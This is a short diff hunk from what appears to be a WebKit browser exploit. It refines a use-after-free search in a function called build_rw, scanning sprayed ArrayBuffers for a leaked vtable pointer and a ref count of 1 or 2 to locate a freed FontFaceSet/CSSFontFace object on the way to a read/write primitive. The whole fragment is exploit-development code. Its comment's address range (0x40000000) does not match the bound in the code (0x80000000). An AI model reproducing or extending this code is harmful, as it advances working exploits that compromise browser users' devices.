@@ -1169,10 +1169,16 @@ function build_rw(result) {
         try {
           const view = new DataView(ab);
           const vtable = view.getBInt(0, true);
-          if (vtable.hi !== 0 || vtable.lo > 0x100000) {
-            uaf_ab = ab;
-            logger.info("FontFaceSet: found vtable at size 0x" + size.toString(16) + " vtable=0x" + vtable.toString(16));
-            break;
+          // Valid vtable: 32-bit pointer in WebKit code section (0x100000-0x40000000)
+          // AND the ref count at offset 8 should be 1 or 2 (our initialized value)
+          if (vtable.hi === 0 && vtable.lo > 0x100000 && vtable.lo < 0x80000000) {
+            const refcount = view.getBInt(8, true);
+            // Check if ref count was overwritten by CSSFontFace data
+            if (refcount.eq(1) || refcount.eq(2)) {
+              uaf_ab = ab;
+              logger.info("FontFaceSet: found UAF buffer at size 0x" + size.toString(16) + " vtable=0x" + vtable.toString(16) + " rc=" + refcount.toString());
+              break;
+            }
           }
         } catch(e) {}
       }
